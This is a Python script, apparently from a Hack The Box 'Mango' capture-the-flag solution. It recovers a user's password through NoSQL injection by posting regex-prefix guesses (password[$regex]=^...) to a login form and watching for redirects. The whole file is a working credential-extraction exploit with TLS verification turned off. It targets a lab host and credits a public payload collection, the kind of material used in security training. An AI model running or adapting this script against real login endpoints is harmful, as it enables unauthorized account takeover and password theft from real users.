import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

# Iterates over a character range and checks for found chars using nosql injection.
# If stuck or looping add regex '.' as wildcard to password (possible bad char).
# credit and original code: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

username='mango'
password=''
u='http://staging-order.mango.htb'
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
        payload='username=%s&password[$regex]=^%s&login=login' % (username, password + c)
        r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
        if 'OK' in r.text or r.status_code == 302:
          print("Found one more char : %s" % (password+c))
          password += c
